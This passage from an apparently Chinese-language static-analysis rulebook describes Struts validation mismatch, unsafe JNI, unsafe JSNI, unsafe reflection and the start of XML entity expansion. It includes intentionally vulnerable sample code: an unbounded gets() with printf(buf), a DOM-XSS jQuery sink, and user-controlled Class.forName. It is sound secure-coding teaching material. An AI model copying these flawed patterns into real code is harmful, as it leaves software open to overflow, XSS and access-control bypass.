<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-Validator-Without-Form-Field"><a href="#Struts-Validator-Without-Form-Field" class="headerlink" title="Struts: Validator Without Form Field"></a>Struts: Validator Without Form Field</h4><h5 id="ABSTRACT-341"><a href="#ABSTRACT-341" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>没有出现在相关表单上的验证字段暗示着相应的验证逻辑已经过时。</p>
<h5 id="EXPLANATION-341"><a href="#EXPLANATION-341" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>开发人员对 ActionForm 类进行修改后，很容易忘记更新验证逻辑。如果验证逻辑没有得到适当维护，一个表现是 action form 和 validation form 之间出现不一致。</p>
<p>例 1.a：包含两个字段的 action form。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    public class DateRangeForm extends ValidatorForm &#123;</span><br><span class="line"></span><br><span class="line">    String startDate, endDate;</span><br><span class="line"></span><br><span class="line">    public void setStartDate(String startDate) &#123;</span><br><span class="line"></span><br><span class="line">        this.startDate = startDate;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setEndDate(String endDate) &#123;</span><br><span class="line"></span><br><span class="line">        this.endDate = endDate;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 1.a 显示了一个包含两个字段的 action form，这两个字段是 startDate 和 endDate。</p>
<p>例 1.b：包含三个字段的 validation form。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;DateRangeForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field property=&quot;startDate&quot; depends=&quot;date&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;arg0 key=&quot;start.date&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field property=&quot;endDate&quot; depends=&quot;date&quot;&gt;</span><br><span class="line"></span><br><span class="line">         &lt;arg0 key=&quot;end.date&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field property=&quot;scale&quot; depends=&quot;integer&quot;&gt;</span><br><span class="line"></span><br><span class="line">         &lt;arg0 key=&quot;range.scale&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>例 1.b 为 action form 列出了一份 validation form。validation form 列出了第三个字段：scale。第三个字段的出现表明 DateRangeForm 在没有考虑到验证的情况下进行了修改。</p>
<p>验证逻辑的维护至关重要，验证逻辑必须与应用程序的其余部分保持同步。未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-340"><a href="#RECOMMENDATIONS-340" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>这个错误通常暗示着发生了下面三种情况中的一种：</p>
<p>－ 开发人员从一个 ActionForm 类中删除了一个字段，但是没能更新验证逻辑。</p>
<p>－ 开发人员在一个 ActionForm 类中重命名了一个字段，但是没能更新验证逻辑。</p>
<p>－ 验证字段名称或者 ActionForm 的成员名称中存在一个排字错误。</p>
<p>在所有的情况下，删除或修改验证字段的名称会导致 Fortify 安全编码规则包不再指出问题所在，但是您应该利用这个机会检查操作表单和验证表单。这个小错误可能意味着系统面临着巨大的潜在威胁，一些更难察觉的验证错误可能已经在同一时间潜入了应用程序。这就需要进行检查来确保长度和字段值仍然正确。</p>
<h5 id="REFERENCES-339"><a href="#REFERENCES-339" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 110</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Unsafe-JNI"><a href="#Unsafe-JNI" class="headerlink" title="Unsafe JNI"></a>Unsafe JNI</h4><h5 id="ABSTRACT-342"><a href="#ABSTRACT-342" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Java Native Interface（JNI）应用不当会导致 Java 应用程序容易受到其他语言的安全漏洞攻击。</p>
<h5 id="EXPLANATION-342"><a href="#EXPLANATION-342" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当 Java 应用程序使用 JNI 调用以其他编程语言编写的代码时，会发生 Unsafe JNI 漏洞。</p>
<p>示例：以下 Java 代码定义了一个名为 Echo 的类。这个类声明了一个本地方法（下文定义），使用 C 语言将控制台上输入的命令回显给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    class Echo &#123;</span><br><span class="line"></span><br><span class="line">	public native void runEcho();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	static &#123;</span><br><span class="line"></span><br><span class="line">		System.loadLibrary(&quot;echo&quot;);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">		new Echo().runEcho();</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以下 C 语言代码定义了在 Echo 类中实现的本地方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"></span><br><span class="line">#include &quot;Echo.h&quot; //the java class above compiled with javah</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL</span><br><span class="line"></span><br><span class="line">Java_Echo_runEcho(JNIEnv *env, jobject obj)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	char buf[64];</span><br><span class="line"></span><br><span class="line">	gets(buf);</span><br><span class="line"></span><br><span class="line">	printf(buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为这个例子是在 Java 中实现的，所以看上去似乎可以避免诸如 buffer overflow 之类的内存问题。虽然 Java 在内存安全方面做的很好，但是该保护机制并不适用于其他语言编写的且通过 Java 本地接口 (JNI) 访问的源代码中出现的漏洞。尽管有 Java 提供的内存保护机制，但是这个例子中的 C 语言代码仍然很容易受到 buffer overflow 的攻击，因为它在没有执行任何输入检查的情况下就使用了 gets()。</p>
<p>Sun Java(TM) 教程对 JNI 描述如下 [1]：</p>
<p>一旦有了 JNI 框架，您的本地方法就可以像 Java 代码那样利用 Java 对象。本地方法可以创建 Java 对象（包括数组和字符串），并且检查和应用这些对象，以便执行各种相关的任务。本地方法也可以检查和应用由 Java 应用程序代码创建的对象。本地方法甚至可以更新由自己创建的或传递给它的 Java 对象，且更新后的对象可以应用到 Java 应用程序中。因此，在应用程序中，无论是本地语言还是 Java 语言都能创建、更新和访问 Java 对象，并在两种语言间共享这些对象。</p>
<p>通过检查本地方法实现的源代码，可以轻松地发现上述例子中存在的漏洞。根据不同的 C 语言源代码和项目构建方式，这种方式可能在某些情况下不可行，但是多数情况下还是可行的。然而，这种能够在 Java 方法和本地方法间共享对象的能力会进一步加大潜在的风险。在 Java 中数据处理不当时，可能会导致本地代码出现意想不到的漏洞，同样本地代码中的不安全操作会破坏 Java 的数据结构。</p>
<p>通过 Java 应用程序访问的本地代码中出现的漏洞，通常与由本地语言编写的应用程序中存在的漏洞是一样的。这种攻击面临的唯一挑战是：攻击者需要确定 Java 应用程序是否使用了本地代码执行某些特定的操作。可以用多种方法实现上述目的，包括识别那些通常用本地代码实现的某些特定行为，或者利用 Java 应用程序中 system information leak 的漏洞（表明系统使用了 JNI）[2]。</p>
<h5 id="RECOMMENDATIONS-341"><a href="#RECOMMENDATIONS-341" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>审计所有构成某个特定应用程序的源代码，包括在其他语言中执行的本地方法。审计期间，要确保能够正确地解释和处理 Java 和本地代码在边界检查和其他行为之间的差别。特别是确保在以下所有阶段都正确处理了共享对象：对象被传递到本地代码前、对象被本地代码应用期间以及对象被返回给 Java 应用程序后。</p>
<h5 id="REFERENCES-340"><a href="#REFERENCES-340" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Stearns The Java Tutorial: The Java Native Interface</p>
<p>[2] JNI00-J. Define wrappers around native methods CERT</p>
<p>[3] INPUT-3: Define wrappers around native methods Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 111</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Unsafe-JSNI"><a href="#Unsafe-JSNI" class="headerlink" title="Unsafe JSNI"></a>Unsafe JSNI</h4><h5 id="ABSTRACT-343"><a href="#ABSTRACT-343" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>JavaScript 本地接口 (JSNI) 应用不当会导致 GWT 应用程序容易受到 JavaScript 的安全漏洞攻击。</p>
<h5 id="EXPLANATION-343"><a href="#EXPLANATION-343" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当 GWT 应用程序使用 JSNI 调用 JavaScript 代码时，会发生 Unsafe JSNI 错误。</p>
<p>示例：以下 Java 代码定义了一个名为 Redirect 的类。该类声明了一个本地 JavaScript 方法（下文定义），该方法使用 JavaScript 更改文档位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import com.google.gwt.user.client.ui.UIObject;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">class MyDiv &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    public static void changeName(final UIObject object, final String name) &#123;</span><br><span class="line"></span><br><span class="line">        changeName(object.getElement(), url);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    public static native void changeName(final Element e, final String name) /*-&#123;</span><br><span class="line"></span><br><span class="line">        $wnd.jQuery(e).html(name);</span><br><span class="line"></span><br><span class="line">    &#125;-*/;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在此示例中，向 JSNI 函数传递不可信的数据可能会导致基于 DOM 的跨站点脚本攻击。</p>
<h5 id="RECOMMENDATIONS-342"><a href="#RECOMMENDATIONS-342" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>审计所有构成某个特定应用程序的源代码，包括在其他语言中执行的本地方法。在审计过程中，请确保在将数据传递到 JavaScript 本地代码之前检查这些数据，尤其需要确保在所有阶段中正确处理共享对象，这些阶段包括将共享对象传递到 JavaScript 代码前、共享对象由 JavaScript 代码操纵期间以及将共享对象返回给 GWT 应用程序后。</p>
<h5 id="REFERENCES-341"><a href="#REFERENCES-341" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] JSNI Google</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 111</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[22] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Unsafe-Reflection"><a href="#Unsafe-Reflection" class="headerlink" title="Unsafe Reflection"></a>Unsafe Reflection</h4><h5 id="ABSTRACT-344"><a href="#ABSTRACT-344" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>攻击者会创建一个意想不到且贯穿于整个应用程序的控制流路径，从而逃避潜在的安全检查。</p>
<h5 id="EXPLANATION-344"><a href="#EXPLANATION-344" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>若攻击者可以为应用程序提供确定实例化哪个类或调用哪个方法的参数值，那么就有可能创建一个贯穿于整个应用程序的控制流路径，而该路径并非是应用程序开发者最初设计的。这种攻击途径可能使攻击者避开 authentication 或 access control 检测，或使应用程序以一种意想不到的方式运行。即使狡猾的攻击者只能控制传送给指定函数或构造函数的参数，也有可能会成功地发起攻击。</p>
<p>如果攻击者能够将文件上传到应用程序的类路径或者添加应用程序类路径的新入口，那么对应用程序来说，情况会非常糟糕。无论处于上面哪种情况，攻击者都能通过反射将新的行为引入应用程序，而这一行为往往可能是恶意的。</p>
<p>示例：应用程序使用反射 API 的一个共同理由是实现自己的命令发送器。以下例子显示了一个没有使用反射的命令发送器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">String ctl = request.getParameter(&quot;ctl&quot;);</span><br><span class="line"></span><br><span class="line">Worker ao = null;</span><br><span class="line"></span><br><span class="line">if (ctl.equals(&quot;Add&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">  ao = new AddCommand();</span><br><span class="line"></span><br><span class="line">&#125; else if (ctl.equals(&quot;Modify&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">  ao = new ModifyCommand();</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">  throw new UnknownActionError();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ao.doAction(request);</span><br></pre></td></tr></table></figure>
<p>程序员可能会修改这段代码，以便按照如下情况使用反射：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String ctl = request.getParameter(&quot;ctl&quot;);</span><br><span class="line"></span><br><span class="line">Class cmdClass = Class.forName(ctl + &quot;Command&quot;);</span><br><span class="line"></span><br><span class="line">Worker ao = (Worker) cmdClass.newInstance();</span><br><span class="line"></span><br><span class="line">ao.doAction(request);</span><br></pre></td></tr></table></figure>
<p>乍一看，这种修改似乎具有许多优点。代码的行数比原先少了，if/else 代码段也完全删除了，而且还可以在不改变命令发送器的情况下增加新的命令类型。</p>
<p>然而，这种修改允许攻击者将任意实现了 Worker 接口的对象实例化。如果命令发送器仍对 access control 负责，那么只要程序员创建实现 Worker 接口的新类，就务必要修改发送器的 access control 代码。如果未修改 access control 代码，那么一些 Worker 类就没有任何 access control 权限。</p>
<p>解决 access control 问题的方法是让 Worker 对象负责执行 access control 检查。下面是一段重新修改的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String ctl = request.getParameter(&quot;ctl&quot;);</span><br><span class="line"></span><br><span class="line">Class cmdClass = Class.forName(ctl + &quot;Command&quot;);</span><br><span class="line"></span><br><span class="line">Worker ao = (Worker) cmdClass.newInstance();</span><br><span class="line"></span><br><span class="line">ao.checkAccessControl(request);</span><br><span class="line"></span><br><span class="line">ao.doAction(request);</span><br></pre></td></tr></table></figure>
<p>虽然有所改进，但它鼓励了采用分散化的手段进行 access control，这使程序员在 access control 上更加容易犯错误。</p>
<p>这段代码还强调了通过反射构建命令发送器所引发的安全问题。攻击者能为任意种类的对象调用默认构造函数。实际上，攻击者甚至不会局限于使用实现了 Worker 接口的对象；系统中所有对象的默认构造函数都可以调用。如果对象没有实现 Worker 接口，则会在分配 ao 前抛出 ClassCastException。但如果构造函数执行了一些有利于攻击者的操作，就会对应用程序造成伤害。对于简单的应用程序来说，这种情况的影响并不大，但是对于日趋复杂的大型应用程序来说，攻击者利用构造函数发动攻击并非没有可能。</p>
<p>如果在由反射调用返回的不可信任对象上调用使用即时调用者的类加载器检查执行任务的特定 Java API，则可能会危害访问检查，进而影响代码执行链。这些 Java API 会绕过可确保执行链中的所有调用者具有必需安全权限的 SecurityManager 检查。由于此类 API 可以绕过安全访问检查，使系统容易受到远程攻击，因此应格外小心，确保不要在由反射返回的不可信任对象上调用这些 API。有关这些 Java API 的更多信息，请参见“Secure Coding Guidelines for the Java Programming Language”中的准则 9。</p>
<h5 id="RECOMMENDATIONS-343"><a href="#RECOMMENDATIONS-343" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止 unsafe reflection 的最佳方法是采用一些间接手段：创建一个规定用户使用的合法名称列表，并仅允许用户从中进行选择。通过这个方法，就不会直接采用用户提供的输入指定传输到反射 API 的名称。</p>
<p>反射也可以用来创建自定义的数据驱动体系结构，这样，配置文件就可以决定应用程序所使用的对象类型和组合。这种编程风格会带来以下安全问题：</p>
<p>— 控制程序的配置文件是程序源代码的重要组成部分，必须进行保护及相应的检查。</p>
<p>— 因为应用程序的配置文件是唯一的，所以必须执行独特的操作来评估设计的安全性。</p>
<p>— 因为当前应用程序的语意由一个自定义格式的配置文件支配，为了得出最理想的静态分析结果，就需要自定义一些规则。</p>
<p>鉴于以上原因，除非开发组可以在安全评估方面投入大量的精力，否则避免使用这种风格的设计。</p>
<h5 id="REFERENCES-342"><a href="#REFERENCES-342" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Secure Coding Guidelines for the Java Programming Language, Version 4.0</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 470, CWE ID 494</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[6] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="XML-Entity-Expansion-Injection"><a href="#XML-Entity-Expansion-Injection" class="headerlink" title="XML Entity Expansion Injection"></a>XML Entity Expansion Injection</h4><h5 id="ABSTRACT-345"><a href="#ABSTRACT-345" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用配置的 XML 解析器无法预防和限制文档类型定义 (DTD) 实体解析，这会使解析器暴露在 XML Entity Expansion injection 之下</p>
<h5 id="EXPLANATION-345"><a href="#EXPLANATION-345" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XML Entity Expansion injection 也称为 XML Bombs，属于 DoS 攻击，利用格式工整的有效 XML 块，它们在耗尽服务器分配的资源之前不断呈指数式扩张。XML 允许定义作为字符串替代宏的自定义实体。通过嵌套复发性实体解析，攻击者可以轻松使服务器资源崩溃。</p>
<p>下面的 XML 文档介绍了 XML Bomb 的示例。</p>
